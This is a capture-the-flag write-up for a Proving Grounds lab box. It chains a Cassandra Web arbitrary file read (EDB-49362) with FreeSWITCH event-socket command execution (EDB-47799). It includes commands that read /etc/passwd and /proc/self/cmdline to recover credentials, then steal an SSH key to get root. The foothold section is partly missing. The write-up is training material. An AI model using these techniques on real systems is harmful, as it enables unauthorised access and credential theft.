# Clue — Proving Grounds

> [!abstract] Summary
> Clue chains two web-service vulnerabilities. **Cassandra Web** (Thin httpd on port 3000) is vulnerable to a path-traversal / arbitrary file read (EDB-49362); reading `/proc/self/cmdline` leaks the Cassandra Web credentials `cassie : SecondBiteTheApple330`. Those map to the **FreeSWITCH** event-socket service (port 8021), whose `mod_event_socket` accepts the default password — abused via EDB-47799 for command execution as the `freeswitch` user. The same Cassandra Web file-read is then used to exfiltrate `cassie`'s SSH private key, which (despite its `anthony@clue` comment) authenticates as **root** over SSH.

**Target:** `192.168.143.240` (later instance `192.168.142.240` — the IP changed between sessions; use your current target)

## Methodology

1. Scan all TCP ports; identify Cassandra Web (3000) and FreeSWITCH event socket (8021).
2. Exploit Cassandra Web arbitrary file read (EDB-49362) to read `/etc/passwd` and `/proc/self/cmdline`.
3. Recover the Cassandra Web credentials from the process command line.
4. Use FreeSWITCH event-socket command execution (EDB-47799) for a foothold as `freeswitch`.
5. Read `cassie`'s `id_rsa` via the file-read bug and SSH in — the key grants root.

## Exploitation — Cassandra Web arbitrary file read (EDB-49362)

Cassandra Web has a path-traversal bug that lets us read arbitrary files off the host. The public exploit takes a target and a file path:

https://www.exploit-db.com/exploits/49362

Read `/etc/passwd` to enumerate users:

```
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 49362.py 192.168.143.240 /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
cassandra:x:107:114:Cassandra database,,,:/var/lib/cassandra:/usr/sbin/nologin
cassie:x:1000:1000::/home/cassie:/bin/bash
freeswitch:x:998:998:FreeSWITCH:/var/lib/freeswitch:/bin/false
anthony:x:1001:1001::/home/anthony:/bin/bash
```

The interesting local users are `cassie` and `anthony` (both `/bin/bash`), plus the `freeswitch` service account.

> [!tip] Learning note — leak secrets from `/proc/self/cmdline`
> A process's full command line (with any arguments it was launched with) can be read from `/proc/self/cmdline` / `/proc/<pid>/cmdline`. Services started with credentials on the command line leak them here. Reading it through the Cassandra Web file-read exposes the Cassandra Web launch arguments:

```
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 49362.py 192.168.143.240 /proc/self/cmdline   

/usr/bin/ruby2.5/usr/local/bin/cassandra-web-ucassie-pSecondBiteTheApple330
```

The `-u` / `-p` flags give the credentials:

```
ucassie
pSecondBiteTheApple330
```

→ `cassie : SecondBiteTheApple330`

## Foothold — FreeSWITCH event-socket command execution (EDB-47799)

FreeSWITCH's `mod_event_socket` on port 8021 accepts the recovered password. The public exploit (EDB-47799, saved locally as `47799.txt`) authenticates and runs commands as the `freeswitch` user. Note the exploit expects target-relative paths **without** a leading slash:

┌──(kali㉿kali)-[~/Downloads]

> The command execution runs as `freeswitch`, which cannot read `cassie`'s `600`-permission `id_rsa` directly (`-ERR no reply` / empty responses when trying to `cat` it through the event socket, and `anthony`'s `.ssh` is unreadable too). ## Initial access / root — SSH with the key

> [!tip] Learning note — private-key file permissions
> OpenSSH refuses to use a private key that is world/group-readable:
> ```
> @         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
> Permissions 0664 for 'id_rsa' are too open.
> ...
> Load key "id_rsa": bad permissions
> ```
> `chmod +x` does **not** fix this (it actually makes it worse). The key must be `600`:
> ```
> chmod 600 id_rsa
> ```

Save the key, fix its permissions, and connect. Although the key's comment is `anthony@clue`, it authenticates straight to **root**:

```
┌──(kali㉿kali)-[~/Downloads]
└─$ chmod 600 id_rsa       
                                                                         
┌──(kali㉿kali)-[~/Downloads]
└─$ ssh -i id_rsa root@192.168.142.240 
Linux clue 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64
...
root@clue:~# ls
proof.txt  proof_youtriedharder.txt  smbd.sh
root@clue:~# cat proof.txt
The proof is in another file
root@clue:~# cat proof_youtriedharder.txt
13aab0c9645b72170e0f008933d9b1be
root@clue:~# find / -name "local.txt" 2>/dev/null
/var/lib/freeswitch/local.txt
root@clue:~# cat /var/lib/freeswitch/local.txt
fc76998d0cd1bd54c075d65860e9b6a1
```

Since the key lands us as root, there is no separate privilege-escalation step. `proof.txt` is a decoy ("The proof is in another file"); the real root flag is in `proof_youtriedharder.txt`, and the user flag is at `/var/lib/freeswitch/local.txt`.

## Lessons learned

- `/proc/self/cmdline` is a goldmine for any arbitrary-file-read bug — services launched with `-u/-p` or connection strings on the command line leak their credentials there.
- The same credential often unlocks multiple services on a box (Cassandra Web → FreeSWITCH here). Spray recovered creds across every auth surface.
- Two read primitives are not equal: the FreeSWITCH event socket runs as low-priv `freeswitch` and couldn't read `cassie`'s key, but the Cassandra Web bug could. When one file read fails on permissions, try the other.
- OpenSSH enforces strict private-key permissions — `chmod 600` the key, never `chmod +x`.
- A key's comment (`anthony@clue`) does not determine which account it authenticates as. Try it against `root` too.
